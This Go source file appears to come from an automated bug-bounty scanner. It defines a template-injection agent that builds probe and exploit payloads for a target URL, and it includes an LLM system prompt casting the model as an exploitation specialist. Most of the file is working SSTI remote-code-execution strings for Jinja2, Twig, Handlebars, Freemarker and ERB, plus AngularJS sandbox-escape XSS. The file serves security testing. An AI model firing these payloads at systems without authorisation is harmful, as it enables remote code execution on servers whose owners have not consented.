// Package csti implements the Client/Server-Side Template Injection specialist agent.
package csti

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "CSTI/SSTI Agent" }
func (a *Agent) ID() string           { return "csti" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	vulnContext, _ := item.Payload["context"].(string)
	priority, _ := item.Payload["priority"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	payloads := generatePayloads(vulnContext)
	var findings []*base.Finding
	for _, p := range payloads {
		severity := "high"
		if p.canRCE {
			severity = "critical"
		}

		findings = append(findings, &base.Finding{
			Type:       "SSTI",
			URL:        targetURL,
			Payload:    p.payload,
			Severity:   severity,
			Confidence: 0.0,
			Evidence: map[string]interface{}{
				"engine":   p.engine,
				"can_rce":  p.canRCE,
				"expected": p.expected,
			},
			Method: "GET",
		})
	}
	_ = priority
	return findings, nil
}

type templatePayload struct {
	payload  string
	engine   string
	expected string
	canRCE   bool
}

func generatePayloads(vulnCtx string) []templatePayload {
	ctx := strings.ToLower(vulnCtx)
	var payloads []templatePayload

	// Universal detection probes (math expressions)
	probes := []templatePayload{
		{"{{7*7}}", "generic", "49", false},
		{"${7*7}", "generic_dollar", "49", false},
		{"<%= 7*7 %>", "erb", "49", false},
		{"#{7*7}", "ruby_hash", "49", false},
	}
	payloads = append(payloads, probes...)

	// Jinja2 / Flask (Python)
	if ctx == "" || strings.Contains(ctx, "python") || strings.Contains(ctx, "jinja") || strings.Contains(ctx, "flask") {
		payloads = append(payloads,
			templatePayload{"{{config}}", "jinja2", "config_dump", false},
			templatePayload{"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "jinja2", "rce", true},
			templatePayload{"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "jinja2", "rce_alt", true},
			templatePayload{"{{lipsum.__globals__.os.popen('id').read()}}", "jinja2", "rce_lipsum", true},
		)
	}

	// Twig (PHP)
	if ctx == "" || strings.Contains(ctx, "php") || strings.Contains(ctx, "twig") {
		payloads = append(payloads,
			templatePayload{"{{_self.env.display('id')}}", "twig", "rce", true},
			templatePayload{"{{['id']|filter('system')}}", "twig3", "rce_filter", true},
		)
	}

	// Handlebars / Mustache
	if ctx == "" || strings.Contains(ctx, "handlebars") || strings.Contains(ctx, "node") {
		payloads = append(payloads,
			templatePayload{"{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}", "handlebars", "rce", true},
		)
	}

	// AngularJS (CSTI)
	if ctx == "" || strings.Contains(ctx, "angular") || strings.Contains(ctx, "ng-app") {
		payloads = append(payloads,
			templatePayload{"{{constructor.constructor('alert(1)')()} }", "angularjs", "xss", false},
			templatePayload{"{{$on.constructor('alert(1)')()} }", "angularjs_v2", "xss", false},
		)
	}

	// Freemarker (Java)
	if ctx == "" || strings.Contains(ctx, "java") || strings.Contains(ctx, "freemarker") {
		payloads = append(payloads,
			templatePayload{"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "freemarker", "rce", true},
			templatePayload{"${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "freemarker_v2", "rce", true},
		)
	}

	// ERB (Ruby)
	if ctx == "" || strings.Contains(ctx, "ruby") || strings.Contains(ctx, "erb") {
		payloads = append(payloads,
			templatePayload{"<%= system('id') %>", "erb", "rce", true},
			templatePayload{"<%= `id` %>", "erb_backtick", "rce", true},
		)
	}

	return payloads
}

const defaultSystemPrompt = `You are an elite SSTI/CSTI (Server/Client-Side Template Injection) specialist with expertise in:
- Template engine fingerprinting via math probes ({{7*7}}, ${7*7}, <%= 7*7 %>)
- Jinja2/Flask exploitation (config dump, __globals__ traversal, RCE)
- Twig exploitation (filter bypass, system call)
- Handlebars prototype traversal for RCE
- AngularJS sandbox escape (constructor.constructor)
- Freemarker/ERB/Velocity exploitation

RULES:
1. Start with universal detection probes ({{7*7}}, ${7*7})
2. If math evaluates, fingerprint the specific engine
3. SSTI with information disclosure is HIGH severity
4. SSTI with RCE capability is CRITICAL severity
5. For AngularJS CSTI, try sandbox escapes for XSS`
